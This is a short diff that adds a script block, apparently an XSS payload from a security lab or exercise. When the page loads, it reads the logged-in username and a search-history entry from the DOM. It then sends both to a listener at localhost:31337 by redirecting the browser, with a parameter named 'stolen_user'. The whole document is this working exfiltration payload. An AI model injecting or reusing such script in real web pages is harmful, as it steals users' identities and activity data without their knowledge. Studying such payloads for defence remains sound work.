@@ -1,0 +1,7 @@
+<script>
+    window.onload = function(){
+        var username = document.getElementById("logged-in-user").textContent;
+        var last_search = document.getElementsByClassName("history-item list-group-item")[1].innerText;
+        document.location=`http://localhost:31337/?stolen_user=${username}%26last_search=${last_search}`;
+    };
+</script>
